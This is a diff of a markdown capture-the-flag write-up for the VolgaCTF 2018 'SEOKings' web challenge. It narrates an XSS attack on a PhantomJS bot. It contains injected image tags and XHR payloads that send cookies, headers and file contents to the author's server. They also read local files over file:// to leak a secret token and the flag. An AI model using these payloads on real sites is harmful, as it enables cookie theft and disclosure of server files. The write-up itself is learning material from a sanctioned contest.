@@ -1,4 +1,4 @@
-It's write up of SEOKings ( points 350 ) web problem of Volga CTF 2018.
+It's write-up of SEOKings ( points 350 ) web problem of Volga CTF 2018. ( link [here](http://seo-kings.quals.2018.volgactf.ru:8080/) )
 
 It was a long problem, also it was the first time, that I did some xss stuff.
 
@@ -6,36 +6,40 @@ Let's dive into the problem.
 
 The website looks like this :
 
-Main Page
-    Main Page
+	Main Page
+
+![Main Page](https://user-images.githubusercontent.com/17861054/37878445-3f94143a-3087-11e8-80ee-2b0956636bf6.png)
 
 
 You can see the Try button, and the input box above it, where you can insert the website for the company to have a look at.
 
 At first I tried looking for 'robots.txt' on the site but it didn't reveal anything, except something about a 'config.ru' file ( look at the bottom of the page, in red ).
 
-Robots.txt - /opt/seo-kings/config.ru
-    Robots.txt - /opt/seo-kings/config.ru
+	/opt/seo-kings/config.ru
+    
+![Robots.txt - /opt/seo-kings/config.ru](https://user-images.githubusercontent.com/17861054/37878454-686403ac-3087-11e8-95fc-5734dc80afe0.png)
 
-Then I tried '/admin' directory, just some common directory , well this is what I got :
+Then I tried `'/admin'` directory, one of the some common directories' , well this is what I got :
 
-    Admin - Please, use local IP
+    Please, use local IP
+![Admin - Please, use local IP](https://user-images.githubusercontent.com/17861054/37878457-6cf034cc-3087-11e8-998d-e6877ad06d1c.png)
+
 
 Now, it was certain that you can't directly access it, so I started looking into ways to access it from local IP.
 
-Searching around I stumbled upon a NULLCon '13 question's write-up here, through this I came to know about an accidentally found bug in stackoverflow through a header as mentioned here.
+Searching around I stumbled upon a **NULLCon '13 question's write-up** [here](https://sysexit.wordpress.com/2013/02/04/nullcon-hackim-ctf-2013-web-100-200-400-write-ups/), through this I came to know about an *accidentally found bug* in stackoverflow through a header as mentioned [here](https://blog.ircmaxell.com/2012/11/anatomy-of-attack-how-i-hacked.html).
 
 So I set it like this :
 
 `X-Forwarded-For: 127.0.0.1`
 
-Still the same, tried with localhost but nothing changed. Then it clicked me, maybe XSS might work. I made a simple script to get the cookie like this ( It's the most basic of XSS perhaps ) :
+Still the same, replaced `127.0.0.1` with `localhost` but nothing changed. Then it clicked me, maybe XSS might work. I made a simple script to get the cookie like this ( the most basic of XSS perhaps, apart from alert popup boxes ) :
 
 ```
 " /><img src="x" onerror="http://my_server_ip/?cookie='+document.cookie'"></img>
 ```
 
-but it didn't work, then I changed it a bit to this :
+but it didn't work, then I changed it a bit, to this :
 
 ```
 " /><img src="http://my_server_ip/?cookie='+document.cookie'"></img>
@@ -47,13 +51,16 @@ and lo behold I got a ping on my server, however as there wasn't any cookie so I
 188.246.233.46 - - [24/Mar/2018:17:56:25 +0000] "GET / HTTP/1.1" 200 3525 "http://localhost:8080/validator?site=%22%20/%3E%3Cimg%20src=%22http://my_server_ip_here/%22%3E%3C/img%3E" "Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) PhantomJS/1.9.8 Safari/534.34"
 ```
 
-So, now I had to get the bot ( phantomJS ) to visit '/admin' , somehow .
+So, now I had to get the bot ( phantomJS ) to visit `'/admin'` , somehow .
 
-I tried adding iframes to the page and accessing it's content but I wasn't getting anything.
+I tried adding **iframes** to the page and accessing it's content but I wasn't getting anything.
 
-Told the admin about it, he suggested instead of iframe I should try using xhr. Well it was the first time I was doing xss , so I didn't thought I might actually solved it. By now it was 4 am ( IST ) and I had been doing it for the past 4 hours with somewhat little progress.
+Told the admin about it, he suggested instead of iframe I should try using xhr. Well it was the first time I was doing xss , so I didn't thought I might actually solved it. 
+
+By now it was 4 am ( IST ) and I had been doing it for the past 4 hours with somewhat very little progress.
 
 I started back after some good sleep and trying on some other problems. Later in the afternoon I made a simple script called payload.js to get the page using xhr and it's contents.
+
 ```
 try{
     var data = null;
@@ -76,11 +83,13 @@ catch(err){
 ```
 Well this also didn't help much, I wasn't getting anything, after 15 minutes I thought maybe I might be getting something in the headers, changed the JS code, added this
 
+```
 new Image().src="http://my_server_ip/?rsp_headers="+String(this.getAllResponseHeaders());
+```
 
-Still nothing :(
+*Still nothing :(*
 
-Well, it definitely has something evil going on, by now only one hour was left for the CTF to end, I asked one of the admins, he suggested I use file protocol to get 'some file'. Well file protocol, is used to access files on local system. Now, it clicked to me about the hint on 'robots.txt' page /opt/seo-kings/config.ru
+Well, it definitely has something evil going on, by now only one hour was left for the CTF to end, I asked one of the admins, he suggested I use [file protocol](https://en.wikipedia.org/wiki/File_URI_scheme) to get '*some file*'. Well file protocol, is used to access files on local system. Now, it clicked to me about the hint on '**robots.txt**' page */opt/seo-kings/config.ru*
 
 I changed last line of the xhr request to this :
 
@@ -88,9 +97,11 @@ I changed last line of the xhr request to this :
 xhr.open("GET", "file:///opt/seo-kings/config.ru");
 ```
 
-Nothing worked, now it was confusing , I pinged the admin again and it was silly of me to make the request 'asynchronously', well I don't know js much, and as the clock was ticking so didn't care to look for the function definition of xhr.open() , the third parameter was to be made false to make a synchronous request.
+Nothing worked, now it was confusing , I pinged the admin again, he suggested to use *synchronous* request instead. It was silly of me to make the request '*asynchronously*', well I don't know js much, and as the clock was ticking so didn't care to look for the function definition of `xhr.open()` .
 
-The whole script was generated by '**Postman**', I just made the request and clicked on it's code option to get a xhr code ( sweet :p ). So, obviously I didn't know about the synchronous/ asynchronous thing here.
+Well to make it synchronous the third parameter, was to be made false. Obviously, it needed some time to read the file, so the synchronous request.
+
+The whole script was generated by '**[Postman](https://chrome.google.com/webstore/detail/postman/fhbjgbiflinjbdggehcddcbncdddomop/related?utm_source=chrome-app-launcher-info-dialog)**', I just made the request and clicked on it's code option to get a xhr code ( sweet :p ). So, obviously I didn't know about the synchronous/ asynchronous thing here.
 
 Anyway coming back to the point, I changed it to :
 
@@ -98,7 +109,7 @@ Anyway coming back to the point, I changed it to :
 xhr.open("GET", "file:///opt/seo-kings/config.ru", false);
 ```
 
-Well, now I was getting something, decoded the url-encoded string to this :
+Well, now I was getting something. I decoded the url-encoded string to this :
 
 ```
 require 'sinatra'
@@ -117,10 +128,35 @@ map('/admin') {
 
 ```
 Well now, only 15 minutes were left, it was the first time I had seen **sinatra** web application, quickly
-googled the directory structure of it and got this here
+googled the directory structure of it and got this [here](https://nickcharlton.net/posts/structuring-sinatra-applications.html).
+
+```
+.
+├── Rakefile
+├── app
+│   ├── controllers
+│   │   ├── application_controller.rb
+│   │   └── example_controller.rb
+│   ├── helpers
+│   │   └── application_helper.rb
+│   └── views
+│       ├── example.erb
+│       ├── layout.erb
+│       └── not_found.erb
+├── config.ru
+└── spec
+    ├── controllers
+    │   ├── application_controller_spec.rb
+    │   └── example_controller_spec.rb
+    ├── helpers
+    │   └── application_helper_spec.rb
+    └── spec_helper.rb
+```
 
 So, I had to get the file `'/opt/seo-kings/controllers/admin_controller.rb`.
-I quickly changed it the script and got the file like this :
+
+I changed the script and got the `admin_controller.rb` :
+
 ```
 require './app/controllers/application_controller.rb'
 class AdminController < ApplicationController OpenSSL::SSL::VERIFY_PEER = OpenSSL::SSL::VERIFY_NONE SECRET_TOKEN = "d595462f496fd347796b60b605b72ff6"
@@ -132,9 +168,9 @@ else "Please, use local ip"
 end
 end end 
 ```
-Well so I had to add a `GET` parameter named `token` to the **admin** endpoint to get it.
-So, finally I changed the `payload.js` to this :
+Well so I had to add a `GET` parameter named `token` to the **admin** endpoint to get it ( Later the organizers had added a hint that was : **You missed some parameters** )
 
+So, finally I changed the `payload.js` to this :
 ```
 try{
 var data = null;
@@ -179,7 +215,7 @@ And lo behold here comes the flag :
 </html> 
 ```
 
-Well, as mentioned earlier, the CTF had ended 5 minutes earlier .
+Well, as mentioned earlier, I couldn't finish the question on time, the CTF had ended 5 minutes earlier .
 
 But it was fun challenge and definitely got me to learn a lot many things about XSS.
 
